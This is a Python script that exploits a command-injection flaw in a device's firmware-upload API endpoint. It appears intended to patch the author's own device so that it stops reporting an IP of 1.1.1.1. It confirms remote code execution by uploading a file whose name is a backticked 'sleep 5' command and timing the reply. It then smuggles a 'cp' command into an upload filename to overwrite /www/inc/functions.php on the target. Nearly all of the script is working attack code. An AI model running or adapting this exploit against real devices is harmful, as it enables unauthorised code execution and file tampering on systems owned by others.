import requests
import sys
import time

# Konfiguracja
TARGET_IP = "192.168.1.173"
TARGET_URL = f"http://{TARGET_IP}/api/index.php?url=update-file-upload"
LOCAL_FILE_PATH = "local_firmware_work/files_clean/www/inc/functions.php"
REMOTE_PATH = "/www/inc/functions.php"

def check_rce():
    print("Checking RCE vulnerability with backticks and sleep...")
    # Payload filename: `sleep 5`
    
    filename = '`sleep 5`'
    
    try:
        start_time = time.time()
        # Upload a dummy file with the malicious filename
        files = {'file': (filename, b'dummy content')}
        response = requests.post(TARGET_URL, files=files, timeout=10)
        end_time = time.time()
        
        duration = end_time - start_time
        print(f"Upload Status: {response.status_code}")
        print(f"Response Body: {response.text}")
        print(f"Request duration: {duration:.2f} seconds")
        
        if duration >= 5:
            print("RCE confirmed! Sleep command executed.")
            return True
        else:
            print("RCE check failed. Sleep command not executed.")
            return False
            
    except Exception as e:
        print(f"Error checking RCE: {e}")
        return False

def exploit_upload():
    print(f"Uploading {LOCAL_FILE_PATH} to {TARGET_IP} via RCE...")
    
    try:
        with open(LOCAL_FILE_PATH, 'rb') as f:
            content = f.read()
            
        # Payload filename: payload; cp /tmp/*payload* /www/inc/functions.php;
        # Use a unique name to avoid ambiguity
        unique_name = f"payload_{int(time.time())}"
        # We need to copy the file that was just uploaded.
        # It is saved as /tmp/unique_name; cp ...
        # So we use wildcard to match it.
        # Note: wildcards might match other files if not careful.
        # But /tmp/ usually has few files matching *unique_name*.
        
        # Also, we should try to remove the temp file afterwards to be clean?
        # The rm command failed, so it stays there.
        # We can add a rm command to the payload?
        # payload; cp ...; rm /tmp/*payload*;
        
        filename = f"{unique_name}; cp /tmp/*{unique_name}* {REMOTE_PATH};"
        
        files = {'file': (filename, content)}
        response = requests.post(TARGET_URL, files=files, timeout=30)
        
        print(f"Upload Status: {response.status_code}")
        
        if response.status_code == 200:
            print("Payload sent. Checking if file was updated...")
            # We can't easily check the file content, but we can check the API behavior.
            # Or we can try to read it back via RCE (cp to .txt)?
            return True
        else:
            print("Upload failed.")
            return False
            
    except Exception as e:
        print(f"Error uploading: {e}")
        return False

def verify_fix():
    print("Verifying fix via API...")
    # Check if API returns correct IP (not 1.1.1.1)
    # Note: We need to know what API endpoint returns the IP.
    # Based on previous analysis, /api/tlc/1/state might return it?
    # Or /api/index.php?url=tlc&id=1&action=state
    
    try:
        url = f"http://{TARGET_IP}/api/index.php?url=tlc&id=1&action=state"
        r = requests.get(url, timeout=5)
        print(f"API Status: {r.status_code}")
        print(f"API Response: {r.text}")
        
        if "1.1.1.1" not in r.text and TARGET_IP in r.text:
             print("SUCCESS: API reports correct IP!")
        elif "1.1.1.1" in r.text:
             print("FAILURE: API still reports 1.1.1.1")
        else:
             print("Unknown state.")
             
    except Exception as e:
        print(f"Error verifying: {e}")

if __name__ == "__main__":
    if check_rce():
        if exploit_upload():
            time.sleep(2)
            verify_fix()
    else:
        print("RCE failed or /www/inc not writable. Aborting.")
